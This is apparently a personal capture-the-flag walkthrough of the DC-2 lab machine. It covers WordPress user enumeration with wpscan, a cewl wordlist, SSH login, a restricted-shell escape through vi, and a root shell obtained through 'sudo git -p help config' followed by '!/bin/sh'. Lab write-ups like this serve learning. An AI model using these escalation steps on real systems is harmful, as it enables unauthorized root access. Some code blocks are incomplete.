# DC-2

- Key takeaways
    - Don’t bruteforce on ssh with huge password list.
    - Even when site is not visible, add that into /etc/hosts file
    - rbash means restricted ones, look for escalation and then export the bin and sbin paths if necessary.

Identifying the target ip.

basically, only two ports are open at port 80(http) and 7744(SSH) typically port 22.

Checking on web for website.

when you dont get the machine’s web page, add it’s ip and domain name in 

/etc/hosts file being a root.

![image.png](image.png)

In the home page itself, we were given a hint to proceed further into the challenge.

It suggests us to use personalized dict passwords using tool cewl.

Moreover, this is a WordPress site, so whenever we encounter wordpress site, 

just make a wpscan.

-e u to enumerate users if available

```bash

we have got a entry point of login to try those cred..

login as tom and jerry in those sites.

They lead to nothing but suggested to use ssh login.

### SSH login with above cred.

```bash
┌──(kali㉿kali)-[~]

tom@DC-2:~$ ls
flag3.txt usr

```

Use Less command to view those flags easily if it is restricted.

<aside>
⛳

Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

</aside>

while su’ing into jerry,

it says rbash: su : command not found.

---

rbash is simply a restricted shell, so we shall do something to get into normal shell.

then, in this case look for anything like vi. here, there is vi.

- type vi
- Type :set shell=/bin/bash <enter>
- :shell

Now, we will come to bash instead of rbash, now we can export the path variable.

hence, 

```bash
export PATH=$PATH:/bin:/sbin
```

With this, we can now use almost all the commands.

```bash
bin
tom@DC-2:~$ ls usr/bin
less  ls  scp  vi
tom@DC-2:~$ vi

tom@DC-2:~$ su jerry
bash: su: command not found
tom@DC-2:~$ vi

tom@DC-2:~$ export

declare -x LANG="en_US.UTF-8"

tom@DC-2:~$ cd

tom@DC-2:~$ export PATH=$PATH:/bin:/sbin
tom@DC-2:~$ 
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ 

```

### Now explore this jerry user.

```bash
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

jerry@DC-2:~$ 

```

It is having some typo’s like git instead of get, just ignore them. Lol!!

they are the important hints. 

Now, the final flag could possibly be in root, so we must perform privilage escalation.

hence, 

```bash
jerry@DC-2:~$ sudo -l

Git command can be exploited on jerry user and can be pwned the root user.

Open GTFObins and search of git under sudo section and try those commands one by one.

[git](https://gtfobins.github.io/gtfobins/git/)

```bash
sudo git -p help config
!/bin/sh
```

This one allowed me to go,

```bash
# whoami
root
# pwd
/home/jerry
# cd
# pwd
/root
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _
